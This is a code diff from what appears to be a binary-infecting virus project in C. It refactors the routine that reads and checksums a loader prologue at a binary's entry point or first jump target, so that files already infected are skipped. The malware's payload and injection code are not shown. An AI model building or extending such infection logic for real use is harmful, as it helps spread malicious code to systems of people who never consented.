@@ -7,45 +7,41 @@
 /*
 ** if current binary is already our client, don't infect again ! <3
 */
-static bool		check_signature(const uint8_t *signature)
+static bool	check_signature(struct safe_ptr ref, size_t offset, size_t size)
 {
-	if (checksum(signature, LOADER_PROLOGUE_LEN) == LOADER_PROLOGUE_SUM)
+	const uint8_t	*signature = safe(ref, offset, size);
+
+	if (signature == NULL)
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
+
+	if (checksum(signature, size) == LOADER_PROLOGUE_SUM)
 		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED);
 
 	return true;
 }
 
-/* -------------------------------------------------------------------------- */
-
 static bool	not_infected_jump(struct safe_ptr file_ref, size_t entry_offset)
 {
-	void	*client_first_jump = find_first_jump(file_ref, entry_offset);
+	const void	*jump = find_first_jump32(file_ref, entry_offset);
 
-	if (client_first_jump == NULL)
+	if (jump == NULL)
 		return errors(ERR_THROW, _ERR_T_NOT_INFECTED_JUMP);
 
-	void	*jump_destination = get_jump_destination(client_first_jump);
+	const size_t	jump_offset = jump - file_ref.ptr;
+	const void	*jump_destination = get_jump32_destination(file_ref, jump_offset);
 
-	const size_t	loader_offset = (size_t)jump_destination - (size_t)file_ref.ptr;
-	const uint8_t	*signature    = safe(file_ref, loader_offset, LOADER_PROLOGUE_LEN);
+	if (jump_destination == NULL)
+		return errors(ERR_THROW, _ERR_T_NOT_INFECTED_JUMP);
 
-	if (signature == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
+	const size_t	loader_offset = jump_destination - file_ref.ptr;
 
-	return check_signature(signature);
+	return check_signature(file_ref, loader_offset, LOADER_PROLOGUE_LEN);
 }
 
 static bool	not_infected_entry(struct safe_ptr file_ref, size_t entry_offset)
 {
-	const uint8_t	*signature = safe(file_ref, entry_offset, LOADER_PROLOGUE_LEN);
-
-	if (signature == NULL)
-		return errors(ERR_VIRUS, _ERR_V_CANT_READ_SIGNATURE);
-
-	return check_signature(signature);
+	return check_signature(file_ref, entry_offset, LOADER_PROLOGUE_LEN);
 }
-
-/* -------------------------------------------------------------------------- */
 
 bool		not_infected(const struct entry *file_entry,
 			struct safe_ptr file_ref)
